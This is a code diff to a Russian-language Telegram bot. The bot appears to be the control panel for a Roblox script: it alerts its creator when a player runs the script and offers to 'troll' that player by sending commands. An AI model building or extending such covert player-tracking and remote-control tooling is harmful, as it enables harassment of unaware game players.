@@ -30,7 +30,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != CREATOR_ID:
         await update.message.reply_text("❌ У вас нет доступа.")
         return
-    await update.message.reply_text("✅ Бот запущен!\nИспользуйте /user <RobloxName> для управления игроком.")
+    await update.message.reply_text("✅ Бот запущен!")
+
+# === Функция уведомления о запуске скрипта Roblox ===
+async def notify_usage(username):
+    if CREATOR_ID:
+        message = (
+            f'Пользователь в Roblox с именем "`{username}`" использовал ваш скрипт.\n'
+            f'Чтобы использовать на нём троллинг, введите:\n'
+            f'/user "`{username}`"'
+        )
+        await app.bot.send_message(chat_id=CREATOR_ID, text=message, parse_mode="Markdown")
 
 # === /user ===
 async def user(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -60,13 +70,12 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     update_command(username, command)
     await query.edit_message_text(f"Команда '{command}' отправлена {username}!")
 
-# === Запуск бота ===
-if __name__ == "__main__":
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+# === Инициализация бота ===
+app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("user", user))
-    app.add_handler(CallbackQueryHandler(button))
+app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("user", user))
+app.add_handler(CallbackQueryHandler(button))
 
-    print("Бот запущен...")
-    app.run_polling()
+print("Бот запущен...")
+app.run_polling()
